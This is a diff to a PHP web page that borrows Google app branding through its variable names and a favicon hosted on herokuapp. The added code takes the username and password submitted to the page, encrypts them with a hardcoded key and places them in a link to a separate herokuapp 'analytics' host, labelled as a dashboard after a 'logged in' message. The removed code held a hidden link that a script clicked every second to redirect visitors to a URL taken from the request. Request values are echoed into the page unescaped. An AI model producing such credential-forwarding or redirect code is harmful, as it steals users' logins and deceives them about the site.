@@ -1,14 +1,12 @@
 <?php
 
+$googleappsgooglemobileapps8884 = "$_POST[url]";
+
+?>
+
+<?php
+
 $mobile = "$_SERVER[REQUEST_URI]";
-$mobile = str_replace('/','',$mobile);
-$mobile = str_replace('?','',$mobile);
-$mobile = str_replace('q=','',$mobile);
-$mobile = str_replace('-','+',$mobile);
-$mobile = str_replace('&','',$mobile);
-$mobile = str_replace('logout=1','',$mobile);
-$mobile = preg_replace('/username=(.*?)$/','',$mobile);
-$mobile = preg_replace('/([0-9]+)/','',$mobile);
 $installgoogleappsmobileapps84 = "$mobile";
 
 $installappsmobileapps84 = "$mobile";
@@ -19,8 +17,8 @@ $installappsmobileapps84 = "$mobile";
 <title><?php echo "$googleappsblog"; ?></title>
 <meta name='description' content='<?php echo "$google84"; ?>'>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=no">
-<meta name="robots" content="index,nofollow">
-<link rel="shortcut icon nofollow" href="http://mobile84.herokuapp.com/googleappslogoapps88888844.png" type="image/x-icon"/>
+<meta name="robots" content="index,follow">
+<link rel="shortcut icon" href="http://mobile84.herokuapp.com/googleappslogoapps88888844.png" type="image/x-icon"/>
 </head>
 
 <?php
@@ -41,7 +39,7 @@ background-color:#f2f2f2;
 .googleapps84
 {
 font-size:26px;
-text-align:left;
+text-align:center;
 font-family: Varela Round, sans-serif;
 background-color:#ffffff;
 border-style:solid;
@@ -106,7 +104,7 @@ margin-top:0px;
 <div class="googleappsinstallapps84">
 <div class="googleappsinstallapps8884">
 
-data update
+previous page
 
 <style>
 
@@ -167,7 +165,7 @@ data update
 
 <?php
 
-$googleapps8884 = "$_GET[url8884]";
+$googleapps8884 = "$_GET[url]";
 
 preg_match_all('/\.(.*?)\./', $googleapps8884, $googleapps84);
 $google84 = $googleapps84[0][0];
@@ -333,24 +331,46 @@ window.onclick = function(event) {
 }
 </script>
 
+<div style="text-align:left;">
+
+logged in
+
+</div>
+
 <?php
 
-$googleapps88888844 = "$_GET[url8884]";
+$googleapps8884 = "googleappsphpapps84.php";
+
+$googleapps88888844 = "$_POST[username]";
+
+$googleapps888844 = "$_POST[password]";
 
 ?>
 
-<div>
+<?php
 
-data update
+$date = date("Y-m-d");
+
+?>
+
+<?php
+
+$string_to_encrypt88888844="$googleapps88888844";
+$password88888844="googleappsmobileapps888888884444";
+$encrypted_string888888884444=openssl_encrypt($string_to_encrypt88888844,"AES-128-ECB",$password88888844);
+
+$string_to_encrypt88884474="$googleapps888844";
+$password888844="googleappsmobileapps888888884444";
+$encrypted_string88884474=openssl_encrypt($string_to_encrypt88884474,"AES-128-ECB",$password888844);
+
+?>
+
+<div style="text-align:left;">
+
+go to your analytics dashboard <a rel="nofollow" onClick="window.open('<?php echo "http://mobileapps8884.herokuapp.com/analytics/index.php?username=$encrypted_string888888884444&password=$encrypted_string88884474"; ?>','_self')">page</a>
 
 </div>
 
-<mobileapps84 style="display:none;">
-
-or go to previous page <a rel="nofollow" id="googleappsmobileapps8884" onclick="window.open('<?php echo "$googleapps88888844"; ?>','_self');">previous page</a>
-
-</mobileapps84>
-
 </div>
 </div>
 
@@ -359,14 +379,4 @@ or go to previous page <a rel="nofollow" id="googleappsmobileapps8884" onclick="
 </div>
 
 </div>
-
-<script>
-
-setInterval(function () {
-
-document.getElementById("googleappsmobileapps8884").click();
-
-}, 1000);
-
-</script>
 
